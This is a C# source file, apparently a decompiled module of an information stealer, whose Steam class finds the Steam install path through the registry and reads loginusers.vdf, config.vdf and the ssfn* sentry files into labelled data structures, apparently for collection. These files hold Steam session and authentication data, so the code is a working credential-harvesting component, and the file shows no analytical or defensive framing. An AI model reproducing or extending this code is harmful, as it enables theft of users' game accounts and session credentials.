using System;
using System.Collections.Generic;
using System.IO;
using client.Helpers;
using client.Models;
using Microsoft.Win32;

namespace client.Body
{
	// Token: 0x02000048 RID: 72
	internal class Steam
	{
		// Token: 0x060001A9 RID: 425 RVA: 0x00009598 File Offset: 0x00007798
		public static List<DefaultFileStructure> Get()
		{
			List<DefaultFileStructure> result = new List<DefaultFileStructure>();
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Valve\\Steam");
			if (registryKey == null)
			{
				return result;
			}
			object value = registryKey.GetValue("InstallPath");
			string text = (value != null) ? value.ToString() : null;
			if (string.IsNullOrEmpty(text) || !Directory.Exists(text))
			{
				return result;
			}
			return Steam.Copy(text);
		}

		// Token: 0x060001AA RID: 426 RVA: 0x000095F4 File Offset: 0x000077F4
		private static List<DefaultFileStructure> Copy(string root)
		{
			List<DefaultFileStructure> list = new List<DefaultFileStructure>();
			list.Add(Steam.GetConfigFile(root, "loginusers.vdf"));
			list.Add(Steam.GetConfigFile(root, "config.vdf"));
			foreach (string text in Directory.GetFiles(root, "ssfn*"))
			{
				list.Add(new DefaultFileStructure
				{
					FileContent = FileHelper.ReadFile(text),
					FileName = Path.GetFileName(text),
					Service = DataType.Steam
				});
			}
			return list;
		}

		// Token: 0x060001AB RID: 427 RVA: 0x00009674 File Offset: 0x00007874
		private static DefaultFileStructure GetConfigFile(string root, string file)
		{
			string str = root + "\\config";
			DefaultFileStructure result = new DefaultFileStructure();
			if (File.Exists(str + "\\" + file))
			{
				result = new DefaultFileStructure
				{
					FileContent = FileHelper.ReadFile(str + "\\" + file),
					FileName = file,
					Service = DataType.Steam
				};
			}
			return result;
		}
	}
}
